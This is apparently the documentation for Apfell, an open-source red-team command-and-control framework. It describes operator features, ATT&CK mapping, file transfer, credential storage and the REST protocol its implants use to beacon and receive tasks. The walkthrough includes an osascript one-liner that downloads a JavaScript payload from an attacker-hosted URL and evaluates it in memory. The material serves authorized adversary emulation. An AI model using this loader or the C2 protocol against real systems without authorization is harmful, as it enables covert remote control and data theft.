![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_show_transformed_task.png)  

### Command Versions
Apfell keeps track of the version of every command. The version of the command increases by one for every change to the command (and that version is reflected across all operations). This means if the name, description, help, code, or the needs admin flag changes, then the version will increase by one. How is this useful? Well, this information is saved off and leveraged in a few different places.
 
When a payload is created, you can select which commands to include in the base payload. These commands have versions, which Apfell tracks. From the Payload Management page, you can select the config of any payload to see which commands are stamped into the payload, the versions of those commands, and the current versions on the Apfell server. If any of them don’t match up, then the row is highlighted. This gives a quick view to see if you need to load a new version of the command when you get a callback from that payload. This was illustrated in the payloads section above.
 
Additionally, each callback keeps track of which commands are loaded and their versions. Similar to the base payload, this gives a quick overview to see if any commands are out of sync with the Apfell server. When you get an initial callback, the callback has all of the commands loaded that were stamped into the payload and those versions of the commands. Each time you load a new command though, the callback keeps track. This can be seen by clicking “View Loaded Commands” on the specific callback.

### MITRE ATT&CK Mappings
Every command can have one or more MITRE ATT&CK technique mappings. This can be as simple as the technique for `PowerShell`, or as granular as you like. Simply select the ATT&CK T# and name from a dropdown when editing or adding a command. Once you issue a task to an agent, the ATT&CK mapping from the associated command follows it. The command level isn’t a great spot to be granular with ATT&CK though, so I also created one more avenue for ATT&CK mappings. 

Consider the following example: the `shell` command for Apfell-jxa is tagged with the `Command-Line Interface` ATT&CK ID: 
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_shell_attack_mapping.png)  

That’s fine for that level, but once we actually use the shell command and provide a specific command line, we can get more specific. So, you can use a regular expression that says (for example) if the shell command’s parameter is `id` or `whoami` then additionally tag that specific task with the ATT&CK ID for `System owner discovery`. This is hopefully a nice deviation from having to be specific upfront or do a lot of command line parsing. We can do this from the Reporting -> ATT&CK Mappings page.

Selecting `Commands by ATT&CK` will light up all of the ATT&CK cells have have associated commands:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_commands_by_attack.png)  

If you actually click one of these highlighted cells, you’ll get more detailed information:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_command_line_interface_mappings.png)  

This breaks it out by payload type and the associated commands. You can do the same for all of the tasks that have been issued in an operation and see how they map out. For tasks, you can click the `X` to remove the ATT&CK mapping for that task. For commands, you need to go to the `Payload Management` page and edit it there.
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_tasks_cli_attack.png)  

With the regex box, you can add more ATT&CK mappings. Simply select from the dropdown which ATT&CK technique you’re wanting to map to, enter in your regex, and hit `Match Tasks`. If you’re really confident, that’ll do all of the mappings behind the scene and you can hit `Tasks by ATT&CK` to see your handiwork. If you’re unsure though, then select `Test` and then hit `Match Tasks` to see some information about what would have matched (it won’t do any updates though). For example, let’s see what matches some `id|whoami*` commands:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_test_regex.png)  

You can see what we spit out the associated task (which you can click to see more information), the task, and any current ATT&CK mappings on that task. The regex is matched against both the original parameters you enter and the transformed parameters. You can keep refining your regex until you’re happy with it, then unselect `test` and submit. This is matching against the parameters exclusively, so if the whole command was `shell id`, you'd only be testing your regex against `id`.

At any point you can click the `Output to ATT&CK Navigator`to get a JSON file that’ll import into MITRE’s ATT&CK Navigator for easy sharing.

### Import Export Commands
If you get everything set up just right, it can be annoying to recreate it for another Apfell server. So, I added in the ability to export and import all of the payload types, commands, and c2 profile  information for a payload type via JSON files. This makes it easier to share new payload types between people as well since most of the information is stored within the JSON blob. This will store everything for that row – basic information, module load transforms, payload create transforms, and everything about those commands that we’ve discussed so far. I also include all of the files associated as base64 encoded sections in the JSON file. The only thing that’s not imported/exported is the command transforms since those are operation specific.

## Operating
Now that we have C2 profiles running, payload types created, commands configured, and payloads created, it’s time to actually start operating. The active callbacks page shows a lot of information about the current callbacks:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_callback_view.png)  

Since we’re tracking so much information along the way, you can see the typical information about the target (host, ip, user, pid), as well as the initial checkin, which payload type, which c2 profile, who created the initial payload, and the default description (this is auto populated from the base payload). If you select "interact" on a callback and then select multiple other callbacks, when you issue a task, your task will be issued to all selected callbacks.

From the tasking line when you’re interacting with a callback, you can do a few directives to update some information. If you do `set description X`, the description will get updated (you can also do this from the dropdown next to the interact button). Now, if the description is set to something other than the default tag for the payload, then the corresponding tab will be updated to reflect this new description like below:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_set_description.png)  

You can set it back to the default at any time by doing `set description reset`. One more directive you can do is `set parent X` which sets the parent callback of the current callback where X is the number of the parent callback. This number can be seen next to the “interact” button for each callback. In this UI that doesn’t mean anything, but it’ll make more sense in the analytics section. 

Every callback is also assigned a random color each time you refresh the page (every user sees different colors). Your current callback that you’re interacting with will be highlighted compared to the other callbacks listed. This should help make it a bit easier to trace things back at a glance. 

When you start typing a command, possible commands registered with the callback’s payload type will popup as hints to help you. You can use the “left” and “right” arrow keys to cycle through these choices:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_command_hint.png)  

You can also use the “up” and “down” arrow keys to cycle through commands that have been tasked to that callback. These aren’t just your commands, these are all of the tasks submitted across everybody interacting with the callback. 

The last interesting feature is that all output for a given command is grouped together, not just in a completely sequential list. Take the following for example:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_output_grouping.png)  

I executed two commands - a continuous ping to 8.8.8.8 and a “whoami” command. From looking at the timestamps, you can see that the response from the “whoami” came back before the latest response from ping, but they’re not interweaved. Instead, all of the output for each command is grouped together with a timestamp of which it was received. This helps declutter the user interface when dealing with long running tasks for issuing many tasks at once. 

### All Tasks
You can view all tasks (across all callbacks and operators) at once in a single place. These tasks are grouped by callback and time, along with their output. For long-running operations, this can take a little while to load. I’m currently working on pagination for this, but right now it’s all just loaded. You can see which callbacks are currently active in the UI and which ones have been “removed”. 
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_all_tasks.png)  

Making a callback active here will bring it back to the main UI for active callbacks. Additionally, you can click any task to have it reveal the output for the command. 
### Screencaptures
Screencaptures are available in two places - within their own page and in the active callbacks area. To view screencaptures for a specific callback, select screencaptures from that callback’s dropdown menu to be presented with a view like the following:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_callback_screenshot.png)  
You can click the text to show/hide the screencaptures.

If you go to the screencaptures page, you can see all screencaptures across an operation at a time (instead of just one callback at a time). Screencaptures highlighted in red are still downloading and will show you a progress state:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_download_screencapture.png)  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_all_screencaptures.png)  
Again, you can click the text to show/hide each callback at a time.

### Uploads and Downloads
Upload and download generally work as expected, except you get more detailed information for downloads and you can upload a file straight from your attacker box to the target transparently. For example, let’s upload an image:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_upload_parameters.png)  

If we already have a file associated with the database, we can just set the file_id to that value, otherwise, we can pick a local file. We also specify where to store it on the target. After a little preprocessing, this gets translated to the following for the agent:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_upload_tasking.png)  

Notice how our file upload was automatically stored on the Apfell server, associated with the database, and given a file_id to use without us having to explicitly do anything. Now the agent can pull down that file by ID. 

When downloading, we get detailed information about where the file will be saved on the Apfell server as well as information about how many chunks it’s going to take to download the full file:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_download_tasking.png)  

You can either browse to that URL on the Apfell server to download the file, or we can view uploads and downloads in a more user friendly fashion:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_view_all_upload_download.png)  

These uploads and downloads are grouped by action (upload, download, manual upload) and grouped by the callback’s `host` parameter. You can click these links to download the files.

### Credentials
Right now credentials have to be manually added to the database for an operation, but you can specify if they’re plaintext, hash, key, etc:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_credentials.png)  

These credentials can then be accessed with the “Credential” parameter for a command. You can just copy paste as well if you want too. 

### Search
This is a cool feature for bigger operations - you can search across an entire operation’s tasks (parameters) and responses. Searches are automatically given wildcards on either side:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_search.png)  
You can see which callback, who issued the task, which task, and the output.

### Task Sharing
Every task can be shared between operators as long as they both are part of the right operation. Simply clicking on the task number will take you to a share task page which just shows information related to that task:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_share_task.png)  

Just share that page URL to the other members of the operation. This is a small recreation of how that task looks in the active callbacks user interface. 

### Comments
Every task can have a single comment on it by any operator that's able to view the task (i.e. part of the operation). You can see who made the comment (and optionally edit or remove it):
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_comments.png)  

These are pretty useful for marking which tasks were extra important that day, which instances of commands worked in an operation, or noting why you were running the command in the first place. All comments in an operation can be searched and sorted by callback or by operator:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_search_comments.png)  

## Reporting
Reporting is pretty basic right now and offers the ability to output:
* Just all commands issued (no output)
* All commands issued with output grouped by command
* All commands issued with output in a strictly chronological timeline

I'm working on more reporting formats and better designs as well.

## Contributing
This is a completely free and open source project, so I'm happy to take issues, bugs, feature suggestions, and pull requests for anything.

The nice thing about having everything so modular is that if you're just interested in making new JXA commands, it's just a single file with almost no other dependencies.
If you're interested in creating new c2 mechanisms, you can make only the server side if you want, or you can create the agent side as well.
If you want to make a new payload type, it's pretty modular and isolated as well.

I'll be doing a small blog series on how to create a new payload type and how to create a new c2 profile as well for examples people can look at.
## Quick Operational Walkthrough

![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_login.png)  

- If you'd like to create a new user, simply click to register  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_register.png)  
 
- Once you select an operation, you need to create a payload. Head over to `Create Components` and select `Create Base Payload`  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_create_components.png)  

- Here you'll select which c2 profile you want to use (I selected `default` which calls back directly to the apfell server and uses the RESTful endpoints). If you select anything other than the default payload, you will need to go to the `c2 profiles management` page and `start` that profile before your callback will work. Fill out any required parameters. Then select the payload type you want to use. Give the location of where you want the created payload to be saved (`test.js` in my case) and optionally give the payload a tag. This tag will be used to pre-populate the `description` field when a callback initially checks in using this payload. If you don't put in one, I'll use a generic description for you. Lastly, select which commands you wanted included by default in this payload. You can select as many or as few as you like. I selected to have the `load`, `exit`, and `shell` features initially, and I can load in new commands as I need them. When you hit submit you'll either see an error or a message like:  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_create_payload.png)  

- What if you want to do something else for your c2 profile? Maybe you don't want your callback posting to `/api/v1.0/callbacks/5/nextTask` since that's a bit on the nose. Well, I've started to implement ways for you to customize this. In the c2 management page you can create new c2 profiles, view all of the files that are currently loaded into the system, download those files, or delete them:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_c2_management.png)

- Ok, now you have a payload, you need to host it somewhere. You can host it on your infrastructure, or for testing, I can host it with a simple python http web server for you  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_hosted_files.png)  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_host_payload.png)  

- Next, you'll need to actually execute the payload. That's your business, but I do have a one-liner you can execute to run the apfell-jxa payload in memory if you want  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_execute_payload.png)  
```bash
osascript -l JavaScript -e "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('HTTP://192.168.205.151:8080/test.js')),$.NSUTF8StringEncoding)));" 
```
- If you go to the `Operational Views` and select `Active Callbacks` you'll now see your callback check in. You can click interact and start entering commands to interact with your payload  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_interact.png)  

- If you're unsure what a command does, you can either type `help {command_name}` to see a brief help syntax or you can go to `api`->`apfell-jxa help` for descriptions and more thorough help.
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_help.png)

- If you're still weary about the command, you can always go to `Manage Operations` -> `Payload Management` and select the `Edit` button under the `Edit Commands` columnn for a given payload type (by default it's just the apfell-jxa payload). Here is where you can select any of the commands and see/edit their actual code and parameters.

### In-Server Help
Once you've logged into Apfell, you can access some additional help. 
- CommandLines - provides information about how to interact with the RESTful interface via terminal and Curl
- Documentation - will eventually provide a more thorough manual of how Apfell is organized, how to extend it, how logging works, and how to interact with the dashboards
- apfell-jxa help - provides help on the command lines that can be sent to the apfell-jxa RAT, how they work, and their parameters


## Basic Agent Creation Information

### C2 Information

The agent needs to be able to make web requests to (or communicate through a C2 profile which makes the requests) the following URLs:
- POST: `http://apfell.server:apfell_port/api/v1.2/callbacks`  
  - You can alternatively look at the in-server help (API -> C2 Documentation) to see the endpoints for encryption
  - This endpoint is registering a new callback
  - This request needs to have a JSON blob of: `{"user":"username","host":"hostname","pid":561,"ip":"192.168.12.52","uuid":"UUID_HERE"}`
  - This will get back `{'status': 'success', "id": #, other information about the callback}`, but the status value and ID value are what's important here
- GET: `http://apfell.server:apfell_port/api/v1.2/tasks/callback/#/nextTask`
  - The # will be replaced with the ID value from the POST above this
  - The response will be either `{'command': "None"}` or will be `{"command": "some command name", "params": "some params, potentially a JSON blob", "id": #}`
  - The ID here is the Task ID and will be used in the next message to post data back as a response to that specific task
- POST: `http://apfell.server:apfell_port/api/v1.2/responses/#`
  - The # will be replaced with the task number that you're returning data for. You can post back to the same task # multiple times.
  - The post needs to have a JSON blob of: `{"response": "aXRzLWEtZmVhdHVyZQ=="}` where the base64 encoded value is the output of the task. This can be a base64 encoded JSON blob as well and is expected for certain commands (See the API -> C2 Documentation for which ones)
- GET: `http://apfell.server:apfell_port/api/v1.2/files/#1/callbacks/#2`
  - This is to pull down files from the c2 server (these can be files to drop to disk, load into memory, or anything else)
  - The #1 is the file number; this value will be given as part of the tasking command
  - The #2 is the callback's ID (which you got from making the POST to /callbacks); this allows the server to automatically encrypt the response if necessary based on a lookup of the callback's encryption/decryption keys  
  - The file will come back as a base64 encoded (and potentially encrypted) blob

Outside of these, the agent right now just needs to be able to handle the contents of the commands that are associated with it. These can be whatever you design to go with your agent, so there's no formal guidance. If you want to hook into Apfell's tracking/display for things like keylogging, screenshots, uploads, downloads, or encryption, check out the `API -> C2 Documentation` for what's required for each one.